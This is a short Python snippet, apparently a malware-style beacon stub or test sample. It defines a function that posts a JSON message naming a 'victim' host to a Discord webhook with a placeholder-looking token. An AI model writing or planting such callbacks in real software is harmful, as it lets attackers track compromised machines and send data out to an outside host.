import requests

WEBHOOK = "https://discord.com/api/webhooks/123456789012345678/abcdefGHIjklMNOpqrSTUvwxYZ"


def _beacon():
    requests.post(WEBHOOK, json={"host": "victim"})
